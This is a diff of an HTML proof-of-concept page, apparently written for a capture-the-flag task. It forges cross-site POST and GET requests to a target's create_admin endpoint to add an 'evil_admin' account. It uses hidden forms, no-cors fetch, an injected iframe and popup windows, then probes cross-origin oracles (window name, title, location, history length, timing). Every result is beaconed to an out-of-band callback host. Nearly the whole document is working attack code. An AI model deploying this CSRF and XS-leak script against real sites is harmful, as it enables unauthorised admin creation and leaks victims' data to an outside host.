@@ -1,76 +1,177 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>XS-Leak create_admin PoC</title>
+    <meta charset="UTF-8">
+    <title>XS-Leak Attack</title>
 </head>
 <body>
-
 <script>
-/* ================= CONFIG ================= */
+const TARGET = "https://tasks.goidactf.ru:20385";
+const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
+const ADMIN = "evil_admin";
 
-const TARGET = "https://tasks.goidactf.ru:20385/create_admin";
-const OAST   = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
-const ADMIN  = "evil_admin_" + Math.random().toString(36).slice(2);
+const log = (d) => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));
 
-/* ================= HELPERS ================= */
+const attackWindow = window.open(TARGET + "/admin", "attackWindow");
+let attackCompleted = false;
 
-const log = d =>
-  navigator.sendBeacon(
-    OAST + "/leak?d=" + encodeURIComponent(d)
-  );
-
-/* ================= ATTACK ================= */
-
-// окно-жертва
-const w = window.open("", "sink");
-
-// форма CSRF
-const f = document.createElement("form");
-f.method = "POST";
-f.action = TARGET;
-f.target = "sink";
-
-const i = document.createElement("input");
-i.name = "new_admin_login";
-i.value = ADMIN;
-
-f.appendChild(i);
-document.body.appendChild(f);
-
-// тайминг
-const t0 = performance.now();
-
-// шлём POST
-f.submit();
-
-/* ================= ORACLES ================= */
-
-// 1️⃣ redirect / same-origin oracle
 setTimeout(() => {
-  try {
-    log("href=" + w.location.href);
-  } catch (e) {
-    log("href=blocked");
-  }
+    const form = document.createElement("form");
+    form.method = "POST";
+    form.action = TARGET + "/create_admin";
+    form.target = "attackWindow";
+    
+    const input = document.createElement("input");
+    input.name = "new_admin_login";
+    input.value = ADMIN;
+    
+    form.appendChild(input);
+    document.body.appendChild(form);
+    form.submit();
+    
+    log("form_submitted=true");
+    attackCompleted = true;
+}, 1000);
+
+setTimeout(() => {
+    log("window_closed=" + attackWindow.closed);
+}, 2000);
+
+setTimeout(() => {
+    let name = "blocked";
+    try {
+        name = attackWindow.name;
+    } catch(e) {}
+    log("window_name=" + name);
+}, 2500);
+
+setTimeout(() => {
+    const start = performance.now();
+    let title = "x-origin";
+    try {
+        title = attackWindow.document.title;
+    } catch(e) {}
+    log("title=" + title + "|time=" + (performance.now() - start));
 }, 3000);
 
-// 2️⃣ timing oracle (redirect chain)
 setTimeout(() => {
-  log("dt=" + (performance.now() - t0));
-}, 3500);
-
-// 3️⃣ window replacement oracle
-setTimeout(() => {
-  log("window=" + (w.opener ? "alive" : "replaced"));
+    try {
+        log("location=" + attackWindow.location.href);
+    } catch(e) {
+        log("location=blocked");
+    }
 }, 4000);
 
-// 4️⃣ closed oracle (на всякий)
+const timingAttack = () => {
+    const start = performance.now();
+    fetch(TARGET + "/create_admin", {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'new_admin_login=' + ADMIN
+    }).finally(() => {
+        log("fetch_time=" + (performance.now() - start));
+    });
+};
+
+setTimeout(timingAttack, 3500);
+
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+iframe.id = 'leakFrame';
+document.body.appendChild(iframe);
+
+iframe.onload = () => {
+    const formHtml = `
+        <form id="expForm" method="POST" action="/create_admin">
+            <input type="hidden" name="new_admin_login" value="${ADMIN}">
+        </form>
+        <script>
+            document.getElementById('expForm').submit();
+            setTimeout(() => {
+                try {
+                    parent.postMessage({type: 'location', href: location.href}, '*');
+                } catch(e) {
+                    parent.postMessage({type: 'error', error: 'cross-origin'}, '*');
+                }
+            }, 1500);
+        <\/script>
+    `;
+    
+    try {
+        iframe.contentDocument.write(formHtml);
+    } catch(e) {
+        log("iframe_write_error=" + e.message);
+    }
+};
+
 setTimeout(() => {
-  log("closed=" + w.closed);
-}, 4500);
+    iframe.src = TARGET + "/admin";
+}, 500);
 
+window.addEventListener('message', (event) => {
+    if (event.data.type === 'error') {
+        log("iframe_error=" + event.data.error);
+    } else if (event.data.type === 'location') {
+        log("iframe_location=" + event.data.href);
+    }
+});
+
+const imgLeak = () => {
+    const img = new Image();
+    img.onerror = () => log("img_error=true");
+    img.onload = () => log("img_loaded=true");
+    img.src = TARGET + "/admin?cache=" + Date.now();
+};
+
+setTimeout(imgLeak, 4500);
+
+const checkRedirectChain = () => {
+    const redirectWindow = window.open('', 'redirectWindow');
+    const form = document.createElement('form');
+    form.method = 'GET';
+    form.action = TARGET + "/create_admin";
+    form.target = 'redirectWindow';
+    form.innerHTML = `<input type="hidden" name="new_admin_login" value="${ADMIN}">`;
+    
+    document.body.appendChild(form);
+    form.submit();
+    
+    setTimeout(() => {
+        try {
+            log("redirect_location=" + redirectWindow.location.href);
+        } catch(e) {
+            log("redirect_blocked=" + e.message);
+        }
+    }, 2000);
+};
+
+setTimeout(checkRedirectChain, 5000);
+
+const historyLengthAttack = () => {
+    const win = window.open(TARGET + "/admin", "historyWin");
+    
+    setTimeout(() => {
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = TARGET + "/create_admin";
+        form.target = "historyWin";
+        form.innerHTML = `<input type="hidden" name="new_admin_login" value="${ADMIN}">`;
+        
+        document.body.appendChild(form);
+        form.submit();
+        
+        setTimeout(() => {
+            try {
+                log("history_length=" + win.history.length);
+            } catch(e) {
+                log("history_error=blocked");
+            }
+        }, 1000);
+    }, 1000);
+};
+
+setTimeout(historyLengthAttack, 6000);
 </script>
-
 </body>
 </html>
